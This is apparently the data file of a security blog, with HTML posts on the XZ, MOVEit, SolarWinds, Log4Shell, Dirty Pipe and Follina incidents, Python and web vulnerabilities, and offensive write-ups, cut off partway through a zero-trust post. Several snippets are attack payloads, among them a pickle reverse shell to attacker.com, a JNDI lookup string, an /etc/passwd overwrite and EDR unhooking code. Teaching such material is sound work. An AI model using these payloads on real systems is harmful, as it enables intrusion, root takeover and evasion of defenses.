export const blogs = [
    {
        id: 'xz-utils-backdoor-analysis',
        title: 'The XZ Utils Backdoor: How Open Source Averted a Global Crisis',
        date: '2026-03-30',
        readTime: '12 min read',
        category: 'Cybersecurity Incidents',
        color: '#ef4444',
        excerpt: 'A technical deep-dive into CVE-2024-3094, detailing how a highly sophisticated state-sponsored actor planted a backdoor in the liblzma library to compromise SSHd authentication across global Linux distributions.',
        content: `
            <p class="lead">The XZ Utils incident represents one of the most sophisticated supply chain attacks in the history of open-source software, aiming to inject remote code execution capabilities directly into OpenSSH servers globally.</p>
            <h3>Incident Overview</h3>
            <p>In early 2024, a threat actor under the pseudonym "Jia Tan" spent years building trust in the XZ Utils open-source project. Ultimately gaining maintainer access, they injected heavily obfuscated binary test files into the release tarballs (CVE-2024-3094).</p>
            <h3>Technical Breakdown</h3>
            <p>The backdoor was not in the core C source code but hidden within seemingly benign test files (<code>bad-3-corrupt_lzma2.xz</code>). During the build process, an obfuscated script extracted a malicious object file, which hooked into the <code>glibc</code> library using GNU indirect functions (<code>IFUNC</code>). When <code>sshd</code> loaded the <code>libsystemd</code> (which depends on <code>liblzma</code>), the backdoor intercepted the <code>RSA_public_decrypt</code> function used in SSH authentication.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-blue-400">
# The conceptual hooking mechanism targeted the SSH auth payload
if (is_payload_signed_by_attacker(incoming_buffer)) {
    execute_payload_as_root(incoming_buffer);
} else {
    return original_RSA_public_decrypt();
}
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Had this backdoor reached mainstream stable Linux repositories (like Debian/Ubuntu), it would have granted the attackers pre-authentication root access to millions of servers, bypassing all cryptographic protections.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Strict Build Processes:</strong> Ensure release tarballs match exactly what is in the public Git repository.</li>
                <li><strong>Dependency Auditing:</strong> Minimize the use of complex dependency chains (e.g., systemd pulling in liblzma into sshd).</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Social engineering in OSS maintenance is a massive threat vector.</li>
                <li>Obfuscation in build scripts can be just as deadly as obfuscation in source code.</li>
            </ul>
        `
    },
    {
        id: 'moveit-transfer-breach-sqli',
        title: 'MOVEit Transfer Breach: Chaining SQLi to Ransomware Exfiltration',
        date: '2026-03-25',
        readTime: '10 min read',
        category: 'Cybersecurity Incidents',
        color: '#f59e0b',
        excerpt: 'Examining the Cl0p ransomware groups exploitation of CVE-2023-34362, a devastating zero-day SQL injection that led to the compromise of hundreds of organizations global data.',
        content: `
            <p class="lead">The MOVEit Transfer breach of 2023 stands as a landmark case in supply chain security, highlighting how a single SQL injection point in a widely-trusted MFT (Managed File Transfer) solution can lead to massive global data exfiltration.</p>
            <h3>Incident Overview</h3>
            <p>The Cl0p ransomware gang exploited a zero-day vulnerability (CVE-2023-34362). Unlike traditional ransomware attacks that encrypt files, Cl0p focused purely on exfiltration, threatening to leak sensitive data.</p>
            <h3>Technical Breakdown</h3>
            <p>The vulnerability originated in the <code>guestaccess.aspx</code> endpoint. The attacker crafted HTTP requests that manipulated the server's session state via SQL injection. By injecting into specific headers, the attacker escalated their privileges to administrative levels, dropping a web shell named <code>human2.aspx</code>.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-purple-400">
# Conceptualizing the SQLi via Python
import requests
url = "https://target-mft.com/guestaccess.aspx"
headers = {
    "X-MOVEit-Trans-Id": "1' OR 1=1; --",
    "User-Agent": "Mozilla/5.0"
}
requests.post(url, headers=headers)
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Over 2,000 organizations and 60 million individuals were impacted. Affected entities included governments and major airlines. The focus on extortion rather than encryption marked a shift in ransomware strategy.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Strict Input Validation:</strong> Parametrize all SQL queries natively.</li>
                <li><strong>Network Segmentation:</strong> Isolate MFT systems and restrict outbound traffic.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Supply chain vulnerabilities have exponential ripple effects.</li>
                <li>SQL Injection remains a critical threat even in modern environments.</li>
            </ul>
        `
    },
    {
        id: 'solarwinds-sunburst-analysis',
        title: 'SolarWinds Sunburst: The Blueprint of Advanced Supply Chain Attacks',
        date: '2026-03-10',
        readTime: '15 min read',
        category: 'Cybersecurity Incidents',
        color: '#10b981',
        excerpt: 'An architectural review of the SolarWinds supply chain attack, detailing how APT29 injected the Sunburst backdoor into enterprise-grade monitoring software.',
        content: `
            <p class="lead">The SolarWinds Orion breach fundamentally changed how the industry views software supply chains, demonstrating that the tools we use to monitor our networks can be weaponized against us.</p>
            <h3>Incident Overview</h3>
            <p>In late 2020, FireEye discovered their internal tools were stolen. Investigation revealed the initial vector was a backdoor trojan injected into updates for SolarWinds Orion, a ubiquitous IT monitoring platform managed by thousands of enterprises and government agencies worldwide.</p>
            <h3>Technical Breakdown</h3>
            <p>The attackers didn't exploit a web vulnerability; they breached the SolarWinds build environment and injected malicious MSIL code into the <code>SolarWinds.Orion.Core.BusinessLayer.dll</code> file. The backdoor remained dormant for up to two weeks before actively resolving a dynamically generated DGA (Domain Generation Algorithm) to contact its Command and Control (C2) server.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-green-400">
// Decompiled representation of the Sunburst dormancy check
if (DateTime.Now.Subtract(this.installationTime).TotalDays < 14) {
    return; // Evade immediate sandbox analysis
}
ResolveDGAAndConnect();
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Over 18,000 customers downloaded the malicious update, including the US Treasury, Commerce, and Homeland Security departments. It allowed persistent, stealthy access to internal environments.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Zero Trust Network Architecture:</strong> Default deny outbound traffic even for management servers.</li>
                <li><strong>Reproducible Builds:</strong> Independent verification that the source code matches the compiled binary.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Trust boundaries must be minimized.</li>
                <li>APT groups are patient, willing to stay dormant to evade detection.</li>
            </ul>
        `
    },
    {
        id: 'log4shell-jndi-injection',
        title: 'Exploiting Log4Shell: Inside CVE-2021-44228 and JNDI Injection',
        date: '2026-02-28',
        readTime: '11 min read',
        category: 'Vulnerability Analysis',
        color: '#8b5cf6',
        excerpt: 'Breaking down the highest-severity vulnerability of the decade: how untrusted string evaluation in Apache Log4j allowed trivial remote code execution via JNDI lookups.',
        content: `
            <p class="lead">Log4Shell proved that a single formatting feature in a logging library can compromise millions of servers worldwide, earning a CVSS score of 10.0.</p>
            <h3>Concept Overview</h3>
            <p>Apache Log4j included a feature to dynamically resolve variables in log messages using Java Naming and Directory Interface (JNDI). By feeding the logger a specific payload, attackers could force the server to fetch and execute a malicious Java class from an attacker-controlled LDAP server.</p>
            <h3>Technical Breakdown</h3>
            <p>An attacker would inject the payload into any field that might be logged (e.g., User-Agent, Search bars, form inputs). Without input sanitization, Log4j evaluated the string.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-blue-400">
// The classic Log4Shell Payload
String userAgent = "\\\${jndi:ldap://attacker.com/ExploitClass}";
logger.info("User Agent: " + userAgent); 
// Log4j resolves the JNDI lookup, connects to LDAP, and executes the class.
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>The ubiquity of Log4j meant that enterprise applications, cloud services, and even Minecraft servers were instantly vulnerable to remote system compromise.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Patching:</strong> Upgrade Log4j to >= 2.15.0 where message lookups were disabled by default.</li>
                <li><strong>Environment Flags:</strong> Set <code>LOG4J_FORMAT_MSG_NO_LOOKUPS=true</code> in legacy environments.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Logging untrusted input without sanitization is inherently dangerous.</li>
                <li>Deep dependency trees make patching critical vulnerabilities exponentially harder.</li>
            </ul>
        `
    },
    {
        id: 'dirty-pipe-linux-privesc',
        title: 'Dirty Pipe (CVE-2022-0847): Privilege Escalation in the Linux Kernel',
        date: '2026-02-15',
        readTime: '9 min read',
        category: 'Vulnerability Analysis',
        color: '#00f3ff',
        excerpt: 'An exploit deep-dive into Dirty Pipe, a local privilege escalation flaw that allowed attackers to overwrite data in read-only files, including /etc/passwd.',
        content: `
            <p class="lead">Dirty Pipe was one of the most elegant and severe Linux kernel vulnerabilities discovered in recent years, allowing unprivileged users to overwrite arbitrary read-only files.</p>
            <h3>Concept Overview</h3>
            <p>The vulnerability existed in the Linux kernel's implementation of pipes and the <code>splice()</code> system call. A flaw in how pipe buffer flags were handled allowed an attacker to inject data into pages of the page cache associated with read-only files.</p>
            <h3>Technical Breakdown</h3>
            <p>An attacker creates a pipe, fills it with data to set the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag, drains it, and then uses <code>splice()</code> to move data from a read-only file (like <code>/etc/passwd</code>) into the pipe. Because the flags weren't cleared, subsequent writes to the pipe would merge into the page cache, overwriting the file on disk temporarily.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-cyan-400">
/* Conceptual Exploit Flow */
int p[2];
pipe(p);
// 1. Fill pipe to set CAN_MERGE flags
// 2. Drain the pipe
// 3. Splice target file into pipe
splice(fd_target, &offset, p[1], NULL, 1, 0);
// 4. Overwrite data!
write(p[1], "root::0:0::/root:/bin/bash", 26);
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Any local attacker or compromised low-privileged service container could instantly escalate to root by wiping the root password in <code>/etc/passwd</code> or modifying SUID binaries.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Kernel Updates:</strong> Patching the Linux kernel to version 5.16.11, 5.15.25, or 5.10.102 immediately resolved the flag clearing issue.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Memory management flaws in the core OS bypass all user-space ACLs.</li>
                <li>Local privilege escalation vulnerabilities are the critical pivot point in any cyber kill-chain.</li>
            </ul>
        `
    },
    {
        id: 'follina-msdt-rce',
        title: 'Follina (CVE-2022-30190): Abusing MSDT for Zero-Click RCE',
        date: '2026-01-30',
        readTime: '10 min read',
        category: 'Vulnerability Analysis',
        color: '#f59e0b',
        excerpt: 'How a malicious Microsoft Word document utilized the Microsoft Support Diagnostic Tool (MSDT) URI protocol to achieve remote code execution without macros.',
        content: `
            <p class="lead">Follina bypassed traditional phishing defenses by executing code without requiring the user to enable macros, achieving RCE simply by opening (or previewing) a document.</p>
            <h3>Concept Overview</h3>
            <p>Threat actors utilized the <code>ms-msdt://</code> URI scheme natively supported by Windows. By embedding a malicious link inside an MS Word <code>.docx</code> relationship file, Word would invoke MSDT to fetch and execute PowerShell code.</p>
            <h3>Technical Breakdown</h3>
            <p>The attacker modifies the <code>word/_rels/document.xml.rels</code> file inside a Word document to point an OLEObject at an external malicious HTML file payload via the MSDT protocol. When Word renders the document, it triggers the URI.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-orange-400">
&lt;!-- Payload executing base64 encoded PowerShell via MSDT --&gt;
&lt;script&gt;
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=... 
$(Invoke-Expression($( [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')) ))) ...\\"";
&lt;/script&gt;
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Because it didn't rely on macros, it bypassed standard enterprise macro-blocking policies. In RTF formats, the exploit would trigger in the Windows Explorer Preview pane—a true zero-click RCE.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Protocol Unregistration:</strong> Deleting the <code>ms-msdt</code> registry key halts the attack entirely.</li>
                <li><strong>Defender Updates:</strong> Applying out-of-band Microsoft patches and ensuring ASR (Attack Surface Reduction) rules block Office applications from creating child processes.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>URI schemes are a potent, often overlooked attack vector in the Windows ecosystem.</li>
                <li>Zero-click exploits make user-training largely obsolete; system hardening is paramount.</li>
            </ul>
        `
    },
    {
        id: 'python-pickle-deserialization',
        title: 'Insecure Deserialization in Python: The Dangers of the Pickle Module',
        date: '2025-12-15',
        readTime: '13 min read',
        category: 'Python Security',
        color: '#10b981',
        excerpt: 'A deep dive into why Python’s native object serialization library, Pickle, is inherently unsafe for handling untrusted data, leading directly to RCE.',
        content: `
            <p class="lead">Python's <code>pickle</code> module is incredibly convenient for saving state, but passing untrusted user input into <code>pickle.loads()</code> is arguably the most dangerous anti-pattern in internal Python development.</p>
            <h3>Concept Overview</h3>
            <p>Deserialization reconstructs byte streams back into Python objects. However, Pickle allows objects to declare custom initialization logic. By crafting a special payload using the <code>__reduce__</code> magic method, an attacker can force the interpreter to execute arbitrary system commands during deserialization.</p>
            <h3>Technical Breakdown</h3>
            <p>An attacker instantiates a malicious class, overrides <code>__reduce__</code> to return a callable (like <code>os.system</code>) and its arguments, pickles it, and sends the payload to the vulnerable endpoint.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-green-400">
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        # When unpickled, this executes a reverse shell
        return (os.system, ("nc -e /bin/sh attacker.com 4444",))

payload = base64.b64encode(pickle.dumps(Exploit()))
# Passing this payload to pickle.loads() on the server triggers the shell instantly.
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Applications storing user session data in cookies via Pickle or accepting serialized objects via internal APIs are fully compromised the moment data is read.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Never Pickle Untrusted Data:</strong> The official Python documentation explicitly states Pickle is unsafe.</li>
                <li><strong>Use Safer Alternatives:</strong> Use JSON (<code>json.loads()</code>) for data exchange. If object mapping is strictly required, use safe schemas like Pydantic or Marshmallow over JSON.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Serialization is not encryption or obfuscation.</li>
                <li>Native language features prioritizing convenience over security must be rigorously audited.</li>
            </ul>
        `
    },
    {
        id: 'python-requests-ssrf',
        title: 'Server-Side Request Forgery (SSRF): Weaponizing the Python Requests Library',
        date: '2025-11-20',
        readTime: '10 min read',
        category: 'Python Security',
        color: '#ef4444',
        excerpt: 'How accepting URLs from end-users without validation in Python web scraping or webhook services allows attackers to pivot inside internal networks.',
        content: `
            <p class="lead">Server-Side Request Forgery allows attackers to bypass firewalls by forcing a vulnerable Python backend to issue HTTP requests on their behalf.</p>
            <h3>Concept Overview</h3>
            <p>If an application fetches external images or triggers webhooks using user-supplied URLs (e.g., <code>requests.get(user_url)</code>), an attacker can supply an internal IP address (like <code>127.0.0.1</code> or AWS Metadata services).</p>
            <h3>Technical Breakdown</h3>
            <p>Attackers commonly target internal APIs, Redis caches, or the cloud instance metadata service (IMDS). A seemingly innocent profile picture fetcher becomes an exfiltration tool.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-blue-400">
import requests
from flask import request

@app.route('/fetch_image')
def fetch_image():
    url = request.args.get('url')
    # VULNERABLE: No validation on where 'url' points
    # Attacker inputs: http://169.254.169.254/latest/meta-data/iam/security-credentials/
    res = requests.get(url)
    return res.content
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Depending on the setup, this grants access to internal administrative consoles or directly leaks AWS/GCP IAM temporary credentials, leading to total cloud takeover.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>URL Parsing & Allowlisting:</strong> Parse the URL, resolve the DNS locally, and ensure the target IP is not within private subnet ranges (RFC 1918).</li>
                <li><strong>Use Cloud Defenses:</strong> Require IMDSv2 on AWS, which requires a specific PUT token, stopping simple GET-based SSRF.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Backend servers implicitly trust themselves; don't let attackers leverage that trust.</li>
                <li>Always validate the resolved IP, not just the domain string, to prevent DNS rebinding attacks.</li>
            </ul>
        `
    },
    {
        id: 'asyncio-race-conditions',
        title: 'Concurrency Bugs: Race Conditions in Python Asyncio Applications',
        date: '2025-11-05',
        readTime: '11 min read',
        category: 'Python Security',
        color: '#8b5cf6',
        excerpt: 'Exploring how non-atomic operations in modern asynchronous Python frameworks (FastAPI/AIOHTTP) result in massive financial race condition vulnerabilities.',
        content: `
            <p class="lead">Asynchronous programming (async/await) brings massive performance boosts to Python, but handling shared state across concurrent coroutines introduces dangerous Time-of-Check to Time-of-Use (TOCTOU) logic flaws.</p>
            <h3>Concept Overview</h3>
            <p>A race condition occurs when two concurrent requests try to interact with the same database record simultaneously. If a user quickly sends two "withdrawal" requests before the database updates their balance, both checks might pass.</p>
            <h3>Technical Breakdown</h3>
            <p>In a FastAPI ecosystem, async handlers pause execution during <code>await</code> calls. If two requests hit an endpoint, they sequence their database reads before sequentially completing writes.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-purple-400">
# VULNERABLE ASYNC LOGIC
@app.post("/transfer")
async def transfer(amount: float):
    user = await db.get_user(current_user_id) # Task 1 and 2 read balance = $100
    if user.balance >= amount: # Check passes for both if amount is $100
        await db.update_balance(user.balance - amount) # Both set balance to $0, $100 stolen
        return {"status": "success"}
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>This is famously exploited in fintech, cryptocurrency exchanges, and e-commerce platforms to artificially duplicate account balances, apply coupons multiple times, or bypass rate limits.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Atomic Database Constraints:</strong> Use SQL transactions with <code>SELECT ... FOR UPDATE</code> to specifically lock rows during an operation.</li>
                <li><strong>Distributed Locks:</strong> Use Redis-based locks (e.g., Redlock) per user-action before processing transactions.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Async IO does not automatically protect against concurrent logic flaws.</li>
                <li>Critical state modifications must be strictly atomic and explicitly locked.</li>
            </ul>
        `
    },
    {
        id: 'graphql-introspection-attacks',
        title: 'GraphQL Introspection Attacks: Exposing Hidden API Surfaces',
        date: '2025-10-15',
        readTime: '8 min read',
        category: 'Web Security',
        color: '#00f3ff',
        excerpt: 'Why leaving GraphQL Introspection enabled in production environments hands attackers a complete map of your entire API architecture.',
        content: `
            <p class="lead">GraphQL's strongest development feature—its self-documenting nature via Introspection—is a severe security liability when left active in production.</p>
            <h3>Concept Overview</h3>
            <p>Introspection allows a frontend developer to ask a GraphQL server for its entire schema, including all queries, mutations, object types, and fields.</p>
            <h3>Technical Breakdown</h3>
            <p>An attacker simply issues the standard <code>__schema</code> query to a GraphQL endpoint. The server dutifully responds with a massive JSON payload documenting every single capability of the API, including internal admin mutations or deprecated, vulnerable fields.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-cyan-400">
query {
  __schema {
    types {
      name
      fields { name }
    }
  }
}
# Output identifies mutations like "promoteUserToAdmin(userId)"
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>While not a vulnerability in itself, introspection accelerates the reconnaissance phase exponentially. Attackers can immediately identify improperly secured mutations and bypass guessing endpoints entirely.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Disable Introspection:</strong> All major GraphQL servers (Apollo, Hasura) allow you to disable introspection in production using configuration flags.</li>
                <li><strong>Query Cost Limits:</strong> Block excessively deep or complex queries to prevent GraphQL DoS algorithms.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Security by obscurity isn't enough, but handing the attacker the architectural blueprint is worse.</li>
            </ul>
        `
    },
    {
        id: 'jwt-none-algorithm-bypass',
        title: 'JSON Web Tokens: Bypassing Weak Signatures and the "none" Algorithm',
        date: '2025-09-30',
        readTime: '9 min read',
        category: 'Web Security',
        color: '#f59e0b',
        excerpt: 'A classic authentication bypass flaw where backend frameworks improperly trust the cryptographic headers configured by the client.',
        content: `
            <p class="lead">JSON Web Tokens (JWT) depend absolutely on cryptographic signatures. When server libraries fail to rigidly enforce signature algorithms, total account takeover occurs.</p>
            <h3>Concept Overview</h3>
            <p>A JWT consists of three parts: Header, Payload, and Signature. The Header contains an <code>alg</code> (algorithm) key. Early or misconfigured JWT validation libraries would trust the <code>alg</code> header. If an attacker changed <code>alg</code> to <code>none</code> and stripped the signature, the server would happily "validate" the forged token.</p>
            <h3>Technical Breakdown</h3>
            <p>The attacker takes their valid JWT, decodes the Base64, edits the payload to change <code>user_role</code> to <code>admin</code>, alters the header algorithm to "none", and recompiles it without the trailing signature hash.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-orange-400">
// Decoding Header:
{ "alg": "none", "typ": "JWT" }
// Decoding Payload:
{ "user": "admin123", "role": "superuser" }
// Sent to server as: base64(header).base64(payload).
// The library processes "none" and skips the math logic!
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>An attacker can forge identities for any user on the platform, leading to unauthorized data access and total administrative control with zero interaction.</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Explicit Algorithm Verification:</strong> When calling <code>jwt.verify()</code> or <code>jwt.decode()</code>, always explicitly pass the allowed algorithms (e.g., <code>algorithms=["HS256"]</code>).</li>
                <li><strong>Use Asymmetric Keys:</strong> When possible, use RS256 so the verification step only requires the public key, mitigating secret brute-forcing.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Never dynamically trust cryptographic configurations supplied by the client.</li>
            </ul>
        `
    },
    {
        id: 'dom-based-xss-sinks',
        title: 'DOM-Based Cross-Site Scripting (XSS): Tracing Sinks and Sources',
        date: '2025-09-15',
        readTime: '10 min read',
        category: 'Web Security',
        color: '#ef4444',
        excerpt: 'How client-side JavaScript execution environments fall prey to DOM-XSS when manipulating URL parameters via innerHTML without sanitization.',
        content: `
            <p class="lead">Unlike Reflected or Stored XSS where the malicious payload is delivered by the server, DOM-Based XSS occurs entirely inside the user's browser when client-side scripts mishandle untrusted data.</p>
            <h3>Concept Overview</h3>
            <p>Modern Single Page Applications (SPAs) rely heavily on reading "Sources" (e.g., <code>window.location.hash</code>, <code>document.referrer</code>) and writing them directly into "Sinks" (e.g., <code>element.innerHTML</code>, <code>eval()</code>). If data flows from a Source to a Sink without sanitization, malicious JavaScript is executed.</p>
            <h3>Technical Breakdown</h3>
            <p>An attacker sends a victim a link with an XSS payload in the URL anchor hash. The web application reads the hash to display a "Welcome back" message.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-blue-400">
// VULNERABLE CODE IN BROWSER
const username = window.location.hash.substring(1); // SOURCE
document.getElementById('welcome-msg').innerHTML = "Hello " + username; // SINK

// Attacker URL: https://site.com/#&lt;img src=x onerror=alert('XSS')&gt;
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Attackers can steal session cookies, manipulate the UI (defacement), or force the user to unknowingly execute administrative actions (CSRF overlap).</p>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>Use Safe Sinks:</strong> Utilize <code>textContent</code> or <code>innerText</code> instead of <code>innerHTML</code> to ensure the browser strictly interprets the data as text.</li>
                <li><strong>Client-Side Sanitizers:</strong> Use libraries like DOMPurify if HTML injection is explicitly intended.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>SPAs require rigorous client-side auditing; server-side WAFs often cannot detect payload executions located entirely inside URL fragments (#).</li>
            </ul>
        `
    },
    {
        id: 'htb-writeup-ad-pivot',
        title: 'HackTheBox Write-up: Bypassing EDR and Pivoting in Active Directory',
        date: '2025-08-30',
        readTime: '16 min read',
        category: 'Write-ups',
        color: '#10b981',
        excerpt: 'A comprehensive walkthrough of a Hard-tier HTB machine, demonstrating Kerberoasting, bypassing Endpoint Detection Response (EDR) hooks, and chaining BloodHound paths.',
        content: `
            <p class="lead">Compromising the perimeter is only the beginning. This write-up details the methodology of lateral movement and Active Directory dominance after establishing an initial beachhead.</p>
            <h3>The Initial Foothold</h3>
            <p>The machine featured an exposed Jenkins instance. Abusing a weak Groovy script console password, I obtained a low-privileged system shell as a service account.</p>
            <h3>Technical Breakdown: Bypassing EDR</h3>
            <p>Before launching internal enumeration, standard PowerShell tools (like BloodHound ingestors) were immediately flagged by Windows Defender/EDR. I utilized an inline C# execution bypass involving direct Syssyscalls (using tools like Dumpert or custom Nim loaders) to unhook the core DLLs in memory.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-green-400">
// Unhooking ntdll.dll to avoid EDR jump instructions
IntPtr pNtdll = LoadLibrary("ntdll.dll");
byte[] originalBytes = GetOriginalSyscallBytes();
VirtualProtect(pNtdll, size, PAGE_EXECUTE_READWRITE, out oldProtect);
Marshal.Copy(originalBytes, 0, pNtdll, originalBytes.Length);
            </code></pre>
            <h3>Lateral Movement: Kerberoasting</h3>
            <p>With EDR blinded in our process, I dumped Service Principal Names (SPNs). Identifying a high-privileged SQL service account vulnerable to Kerberoasting, I extracted the Ticket Granting Service (TGS) hash and cracked it offline via Hashcat, yielding the plaintext credentials for the Database Admin.</p>
            <h3>Key Takeaways</h3>
            <ul>
                <li>EDR evasion is heavily reliant on understanding Windows internals and API hooking.</li>
                <li>Service accounts with weak passwords are the Achilles heel of Active Directory environments.</li>
            </ul>
        `
    },
    {
        id: 'reverse-engineering-android-ssl',
        title: 'Reverse Engineering 101: Disabling SSL Pinning in Android Applications',
        date: '2025-08-10',
        readTime: '12 min read',
        category: 'Write-ups',
        color: '#8b5cf6',
        excerpt: 'A step-by-step guide to decompiling Android APKs and utilizing the Frida dynamic instrumentation framework to disable SSL pinning capabilities for API analysis.',
        content: `
            <p class="lead">To audit mobile APIs, researchers must implement a Man-in-the-Middle (MitM) proxy. SSL Pinning prevents this by enforcing hardcoded certificate validations within the app layer.</p>
            <h3>Concept Overview</h3>
            <p>SSL Pinning ensures the app ignores the device's System Certificate store and only trusts a specifically packaged root certificate. If the backend cert doesn't match the pin, the connection immediately drops.</p>
            <h3>Technical Breakdown</h3>
            <p>Using a rooted Android device and the Frida server, we inject a custom JavaScript payload directly into the running Java process of the application in memory. We locate the <code>TrustManager</code> classes and overwrite their return values to always assume validity.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-purple-400">
// Frida Script to Bypass default TrustManager
Java.perform(function() {
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth) {
        console.log("[+] Intercepted and bypassed certificate check for: " + host);
        return untrustedChain; // Bypass!
    };
});
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Once bypassed, I routed traffic through Burp Suite and uncovered heavily vulnerable, unauthenticated GraphQL mutations exposing PII of other application users.</p>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Client-side security controls (like SSL pinning and obfuscation) are speed bumps, not walls, against a determined reverse engineer.</li>
                <li>API endpoints serving mobile apps must be as strictly defended as those serving web applications.</li>
            </ul>
        `
    },
    {
        id: 'buffer-overflows-rop-chains',
        title: 'Buffer Overflows: Crafting ROP Chains to Bypass DEP and ASLR',
        date: '2025-07-22',
        readTime: '15 min read',
        category: 'Write-ups',
        color: '#ef4444',
        excerpt: 'Moving past basic stack-smashing. A detailed technical explanation of building Return-Oriented Programming (ROP) chains to combat modern memory protections.',
        content: `
            <p class="lead">Historically, an attacker could overwrite an instruction pointer and point it back to executable shellcode placed on the stack. Modern mitigations like DEP (Data Execution Prevention) made the stack non-executable.</p>
            <h3>Concept Overview</h3>
            <p>Return-Oriented Programming (ROP) defeats DEP by utilizing existing executable code currently mapped in memory (within <code>libc</code> or other libraries). By chaining together small chunks of code that end in a <code>ret</code> instruction (called "gadgets"), an attacker can piece together a custom function flow without injecting new code.</p>
            <h3>Technical Breakdown</h3>
            <p>The objective is often to call <code>system("/bin/sh")</code>. We need to find the address of <code>system()</code>, the address of the string <code>"/bin/sh"</code>, and a <code>pop rdi; ret</code> gadget to correctly pass the string argument into the rdi register before executing <code>system</code>.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-orange-400">
# The conceptual ROP Chain payload in Python (pwntools)
payload = b"A" * offset_to_eip
payload += p64(pop_rdi_ret_addr) # Gadget 1: Pops next value into rdi
payload += p64(bin_sh_addr)      # The argument passed into rdi
payload += p64(ret_addr)         # Stack alignment padding
payload += p64(system_addr)      # Call system()

r.sendline(payload)
r.interactive() # Shell obtained!
            </code></pre>
            <h3>Mitigation / Prevention</h3>
            <ul>
                <li><strong>ASLR (Address Space Layout Randomization):</strong> Randomizes memory addresses to make finding gadgets harder.</li>
                <li><strong>Control Flow Integrity (CFI):</strong> Hardware-backed verifications that validate execution jumps.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Memory corruption vulnerabilities are highly complex but devastating when weaponized perfectly.</li>
            </ul>
        `
    },
    {
        id: 'zero-trust-architecture',
        title: 'Designing Zero Trust Architecture: Identity-Aware Proxy Implementations',
        date: '2025-07-05',
        readTime: '14 min read',
        category: 'System Design',
        color: '#00f3ff',
        excerpt: 'Why the traditional corporate VPN model is dying and how designing systems with an Identity-Aware Proxy (IAP) dramatically reduces the internal attack surface.',
        content: `
            <p class="lead">The classic "Castle and Moat" security model assumes anyone inside the corporate VPN is trusted. In an era of rampant phishing and compromised endpoints, this trust model is fundamentally broken.</p>
            <h3>Concept Overview</h3>
            <p>Zero Trust Architecture (ZTA) operates on one mandate: "Never trust, always verify." By placing an Identity-Aware Proxy (IAP) in front of every internal application, access is governed per-request based on strict, dynamic context curves (identity, device health, location), rather than network placement.</p>
            <h3>Technical Breakdown</h3>
